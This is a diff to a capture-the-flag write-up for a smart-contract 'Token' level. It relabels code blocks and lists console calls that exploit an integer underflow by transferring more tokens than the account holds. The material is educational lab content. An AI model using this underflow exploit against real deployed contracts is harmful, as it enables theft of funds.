@@ -40,21 +40,21 @@ contract Token {
 ## Writeup
 There is a famous security pitfall. We can use technique **Underoverflow** to complete this level.
 1. Get new instance.
-2. Call method 
-    ``` solidity
+2. Call the method 
+    ``` javascript
 
     await contract.balanceOf('YOUR_ACCOUNT').then(v=>v.toString())
 
     ```
   It will return default balance `20` .
 3. Call the method
-    ``` solidity 
+    ``` javascript
 
     await contract.transfer('OTHER_ACCOUNT', 1000000)
 
     ```
 4. Call the method 
-    ``` solidity
+    ``` javascript
 
     await contract.balanceOf('YOUR_ACCOUNT').then(v=>v.toString())
 
